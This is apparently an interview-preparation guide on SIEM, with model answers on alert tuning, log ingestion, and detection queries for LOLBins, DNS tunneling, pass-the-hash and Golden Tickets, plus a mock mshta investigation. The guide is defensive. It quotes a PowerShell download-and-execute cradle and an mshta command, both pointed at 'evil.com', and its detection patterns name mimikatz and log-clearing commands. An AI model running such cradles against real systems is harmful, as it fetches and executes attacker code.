## **🔍 Tricky SIEM Questions (Moderate to Hard)**

---

### **1. SIEM Architecture & Performance**
#### **Q1: SIEM Tuning & False Positives**
*"Your SIEM is generating 10,000 alerts per day, but 90% are false positives. How do you reduce the noise without missing real threats?"*
**What they test:**
- Understanding of **alert fatigue** and **tuning methodologies**.
- Ability to **prioritize rules** based on risk.
- Knowledge of **thresholds, exclusions, and suppression**.

**How to answer:**
- **Baseline normal activity** (e.g., whitelist known admin accounts for failed logins).
- **Adjust rule logic** (e.g., require 5+ failed SSH attempts from the same IP in 1 minute).
- **Use threat intelligence** to filter out known benign IPs.
- **Implement machine learning** (if available) to detect anomalies.
- **Leverage MITRE ATT&CK** to focus on high-impact TTPs.

---

#### **Q2: SIEM Data Ingestion Bottlenecks**
*"A critical log source (e.g., Windows Event Logs) is not being ingested into the SIEM. How do you diagnose and fix this?"*
**What they test:**
- Troubleshooting **log forwarding** (e.g., Winlogbeat, Syslog, API).
- Understanding of **SIEM parsers** and **schema mismatches**.
- Knowledge of **network/firewall issues** affecting log flow.

**How to answer:**
- Check **agent status** (e.g., `systemctl status winlogbeat`).
- Verify **network connectivity** (e.g., `telnet SIEM_IP 514` for Syslog).
- Test **manual log generation** (e.g., `eventcreate` on Windows) to see if it appears in SIEM.
- Review **SIEM parser errors** (e.g., Grok failures in ELK).
- Check **firewall rules** (e.g., is port 514/515 open?).

---

#### **Q3: SIEM Query Optimization**
*"A query to find all failed RDP logins is taking 10 minutes to run. How do you optimize it?"*
**What they test:**
- Understanding of **indexing, partitioning, and query efficiency**.
- Knowledge of **SIEM-specific optimizations** (e.g., Splunk `index=*`, ELK `filter` vs. `query`).

**How to answer:**
- **Narrow the time range** (e.g., last 24 hours instead of all time).
- **Use indexed fields** (e.g., `EventCode=4625` instead of `message LIKE "%failed%"`).
- **Avoid wildcards** at the start of queries (e.g., `*admin*` is slower than `admin*`).
- **Pre-filter data** (e.g., use `earliest=-24h` in Splunk).
- **Leverage saved searches** or **reports** for frequent queries.

---

---

### **2. Advanced SIEM Detection & Hunting**
#### **Q4: Detecting Living-off-the-Land Binaries (LOLBins)**
*"How would you write a SIEM query to detect malicious use of `certutil` to download a payload?"*
**What they test:**
- Knowledge of **LOLBin TTPs** (e.g., MITRE ATT&CK T1218).
- Ability to **correlate process creation with network activity**.

**How to answer:**
- **Process creation** (Event ID 4688 in Windows):
  ```sql
  EventCode=4688 AND (CommandLine LIKE "%certutil%" AND CommandLine LIKE "%-urlcache%")
  ```
- **Network connection** (Event ID 5156 or Sysmon Event ID 3):
  ```sql
  EventCode=3 AND (DestinationHostname LIKE "%malicious.com%" OR DestinationIp IN [ThreatIntel_IP_List])
  ```
- **Correlate both** (e.g., same `ProcessID` in both events).

---

#### **Q5: Detecting DNS Tunneling**
*"An attacker is exfiltrating data via DNS tunneling. How do you detect this in SIEM?"*
**What they test:**
- Understanding of **DNS tunneling TTPs** (e.g., long queries, unusual domains).
- Ability to **analyze DNS logs** (e.g., Query Type, Length, Frequency).

**How to answer:**
- **Unusually long DNS queries** (e.g., `length(DNS.Query) > 50`).
- **High volume of DNS queries** to a single domain:
  ```sql
  | stats count by DNS.Query | where count > 100
  ```
- **Base64-encoded subdomains** (e.g., `*.malicious.com` with random strings).
- **Correlate with threat intel** (e.g., known C2 domains).

---
#### **Q6: Detecting Pass-the-Hash Attacks**
*"How do you detect a Pass-the-Hash attack using SIEM logs?"*
**What they test:**
- Knowledge of **Windows authentication events** (Event IDs 4624, 4625, 4672).
- Understanding of **NTLM vs. Kerberos** and **hash usage**.

**How to answer:**
- Look for **Event ID 4624 (Successful Logon)** with:
  - `LogonType=9` (NewCredentials, often used in PtH).
  - `AuthenticationPackageName="NTLM"` (PtH typically uses NTLM).
  - **Same source IP** performing multiple logons with different accounts.
- **Correlate with Process Creation** (e.g., `lsass.exe` accessing hashes):
  ```sql
  EventCode=4688 AND (CommandLine LIKE "%mimikatz%" OR CommandLine LIKE "%sekurlsa%")
  ```

---
#### **Q7: Detecting Golden Ticket Attacks**
*"How would you detect a Golden Ticket attack in Active Directory using SIEM?"*
**What they test:**
- Understanding of **Kerberos authentication** and **Golden Ticket TTPs** (MITRE T1558.001).
- Ability to **analyze AD logs** (Event IDs 4768, 4769, 4771).

**How to answer:**
- **Event ID 4768 (Kerberos Authentication Service)**:
  - Look for **unusual Service Names** (e.g., `krbtgt`).
  - **Ticket Encryption Type=0x17** (RC4-HMAC, often used in Golden Tickets).
- **Event ID 4771 (Kerberos Pre-Authentication Failed)**:
  - High volume of failures followed by a **successful authentication** (indicates ticket forgery).
- **Correlate with unusual logon times** (e.g., logons outside business hours).

---
---
### **3. SIEM Rule Logic & Edge Cases**
#### **Q8: Rule Bypass Scenarios**
*"An attacker bypasses your Sigma rule for detecting `powershell.exe -nop -ep bypass`. How did they do it, and how do you fix the rule?"*
**What they test:**
- Understanding of **PowerShell obfuscation** (e.g., base64, string concatenation).
- Ability to **write resilient detection rules**.

**How to answer:**
- **Bypass methods**:
  - Obfuscation: `powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com')"`
  - Alternative executables: `pwsh.exe`, `mshta.exe`, `wmic.exe`.
  - **Fix the rule**:
    - Use **wildcards** for common obfuscation:
      ```yaml
      selection:
        CommandLine|contains: 'powershell'
        CommandLine|contains|all:
          - '-nop'
          - '-ep'
          - 'bypass'
      ```
    - Add **additional conditions** (e.g., `CommandLine|contains: 'DownloadString'`).

---
#### **Q9: Time-Based Attack Detection**
*"How would you detect a slow, time-based attack (e.g., a beaconing C2 every 24 hours) in SIEM?"*
**What they test:**
- Understanding of **beaconing patterns** and **time-based correlation**.
- Ability to **use statistical analysis** in SIEM.

**How to answer:**
- **Group by source IP and destination** and look for **consistent intervals**:
  ```sql
  | stats count by SourceIp, DestinationIp, _time
  | sort + _time
  | delta _time as time_diff
  | where time_diff ≈ 86400 (24 hours in seconds)
  ```
- **Use machine learning** (if available) to detect anomalies in connection patterns.
- **Leverage threat intel** to flag known C2 IPs.

---
#### **Q10: Detecting Data Exfiltration via Cloud Services**
*"An attacker is exfiltrating data to a cloud service (e.g., AWS S3, Dropbox). How do you detect this in SIEM?"*
**What they test:**
- Knowledge of **cloud service abuse** and **data exfiltration TTPs**.
- Ability to **monitor outbound traffic** and **API calls**.

**How to answer:**
- **Monitor for unusual outbound traffic** to cloud IPs:
  ```sql
  DestinationIp IN [AWS_IP_Ranges] AND BytesOut > 10MB
  ```
- **Detect API calls** to cloud storage (e.g., `PUT` requests to S3):
  ```sql
  Http.Method="PUT" AND DestinationHostname LIKE "%s3.amazonaws.com%"
  ```
- **Correlate with process creation** (e.g., `curl`, `aws cli`, or custom scripts).

---
---
### **4. SIEM Integration & Threat Intelligence**
#### **Q11: Automating Threat Intel in SIEM**
*"How would you automate the ingestion of a new threat feed (e.g., AlienVault OTX) into your SIEM for real-time blocking?"*
**What they test:**
- Understanding of **STIX/TAXII, API integrations, and SIEM enrichment**.
- Ability to **write scripts** (Python) for automation.

**How to answer:**
- **Step 1: Fetch the feed** (Python + OTX API):
  ```python
  import requests
  url = "https://otx.alienvault.com/api/v1/indicators/export"
  headers = {"X-OTX-API-KEY": "YOUR_API_KEY"}
  response = requests.get(url, headers=headers)
  iocs = response.json()["results"]
  ```
- **Step 2: Parse and format IOCs** (e.g., extract IPs, domains, hashes).
- **Step 3: Push to SIEM**:
  - **Splunk**: Use `curl` to send to HTTP Event Collector (HEC).
  - **ELK**: Use `logstash` to ingest JSON.
  - **QRadar**: Use the **Reference Set** API.
- **Step 4: Create detection rules** (e.g., blocklist IPs in firewall/SIEM).

---
#### **Q12: SIEM and EDR/XDR Correlation**
*"How do you correlate SIEM alerts with EDR (e.g., CrowdStrike, SentinelOne) to confirm a compromise?"*
**What they test:**
- Understanding of **EDR/SIEM integration** and **alert correlation**.
- Ability to **pivot between tools** for investigation.

**How to answer:**
- **Step 1: SIEM Alert** (e.g., suspicious PowerShell command).
- **Step 2: Pivot to EDR**:
  - Search for the **same process hash** or **command line** in EDR.
  - Check **EDR detections** (e.g., "Malicious PowerShell Activity").
- **Step 3: Correlate with network data** (e.g., SIEM shows C2 connection, EDR shows the process that initiated it).
- **Step 4: Automate correlation** (e.g., SIEM rule to trigger EDR investigation via API).

---
---
### **5. SIEM Forensics & Incident Response**
#### **Q13: Reconstructing an Attack Timeline**
*"Given a compromised host, how do you use SIEM logs to reconstruct the attacker’s actions?"*
**What they test:**
- Ability to **piece together events** from disparate logs.
- Understanding of **attack kill chain** (recon, initial access, persistence, etc.).

**How to answer:**
- **Step 1: Identify initial access** (e.g., phishing email, RDP brute force).
- **Step 2: Trace lateral movement** (e.g., PsExec, WMI, SMB shares).
- **Step 3: Look for persistence** (e.g., scheduled tasks, registry keys).
- **Step 4: Check data exfiltration** (e.g., large outbound transfers).
- **Tools/Queries**:
  - **Windows Event Logs**: 4624 (logon), 4688 (process creation), 5156 (network).
  - **Sysmon**: Event IDs 1 (process creation), 3 (network connection), 11 (file create).
  - **Correlate with EDR** for file hashes, process trees.

---
#### **Q14: SIEM Log Tampering Detection**
*"An attacker is deleting logs to cover their tracks. How do you detect this in SIEM?"*
**What they test:**
- Knowledge of **log tampering TTPs** (e.g., clearing Event Logs, stopping logging services).
- Ability to **detect gaps in logs**.

**How to answer:**
- **Event ID 104 (Event Log Cleared)** in Windows:
  ```sql
  EventCode=104 AND EventSourceName="Microsoft-Windows-Eventlog"
  ```
- **Service stop events** (e.g., `Winlogbeat` or `Sysmon` service stopped):
  ```sql
  EventCode=7036 AND ServiceName="Winlogbeat"
  ```
- **Unusual gaps in logs** (e.g., no logs for 1 hour during business hours).
- **Correlate with process creation** (e.g., `wevtutil cl` or `Clear-EventLog`).

---
#### **Q15: Detecting Insider Threats**
*"How would you detect an insider exfiltrating data via USB devices?"*
**What they test:**
- Understanding of **USB monitoring** and **data exfiltration TTPs**.
- Ability to **correlate device events with user activity**.

**How to answer:**
- **Monitor USB connection events** (Event ID 6416 in Windows):
  ```sql
  EventCode=6416 AND DeviceDescription LIKE "%USB%"
  ```
- **Correlate with file access** (e.g., large files copied to removable media):
  ```sql
  EventCode=4663 (File Access) AND AccessMask="0x100000" (WriteData) AND TargetFilePath LIKE "%USB%"
  ```
- **Use EDR** to detect **unusual USB activity** (e.g., first-time USB device).
- **Baseline normal USB usage** (e.g., whitelist known devices).

---
---
## **🎯 Bonus: SIEM-Specific Tricky Questions**
| **SIEM Platform** | **Tricky Question**                                                                 |
|-------------------|------------------------------------------------------------------------------------|
| **Splunk**        | *"How do you use `transaction` in Splunk to detect a multi-stage attack?"*       |
| **ELK**           | *"How would you write a Painless script in Elasticsearch to enrich logs with threat intel?"* |
| **QRadar**        | *"How do you create a custom QRadar rule to detect a zero-day exploit?"*          |
| **Microsoft Sentinel** | *"How do you use KQL to hunt for APT29 activity in Sentinel?"*               |
| **ArcSight**      | *"How do you optimize a correlation rule in ArcSight to reduce false positives?"* |

---
---
## **💡 Pro Tips for Answering Tricky SIEM Questions**
1. **Think like an attacker**: Always consider **how an attacker would bypass your detections**.
2. **Use real-world examples**: Reference **actual incidents** you’ve handled or **lab simulations** you’ve built.
3. **Mention MITRE ATT&CK**: Map your answers to **TTPs** (e.g., "This aligns with T1059.001 for PowerShell").
4. **Show automation skills**: Highlight **Python, APIs, or SIEM playbooks** to scale detection.
5. **Ask for clarification**: If a question is vague, ask for **log examples or environment details**.

---
---
## **🔥 Mock Scenario: Putting It All Together**
**Scenario:**
*"A SIEM alert fires for a suspicious `mshta.exe` process spawning `cmd.exe`. The user is a standard employee with no admin rights. Walk me through your investigation."*

**Expected Answer:**
1. **Triage the alert**:
   - Check **process tree** (parent: `mshta.exe`, child: `cmd.exe`).
   - Look for **command line arguments** (e.g., `mshta http://evil.com/script.hta`).
2. **Correlate with network logs**:
   - Did `mshta.exe` make an **outbound connection** to `evil.com`?
   - Check **DNS logs** for resolution of `evil.com`.
3. **Check for persistence**:
   - Look for **scheduled tasks**, **registry keys**, or **startup folder entries**.
4. **Review user activity**:
   - Was the user **phished**? Check **email logs** for malicious attachments/links.
5. **Threat intel check**:
   - Is `evil.com` a **known C2 domain**? (VirusTotal, OTX).
6. **Containment**:
   - **Isolate the host** (via EDR or network segmentation).
   - **Block the domain/IP** in firewall/SIEM.
7. **Detection improvement**:
   - Write a **Sigma rule** to alert on `mshta.exe` spawning `cmd.exe`.
   - Add **YARA rule** for the HTA file if recovered.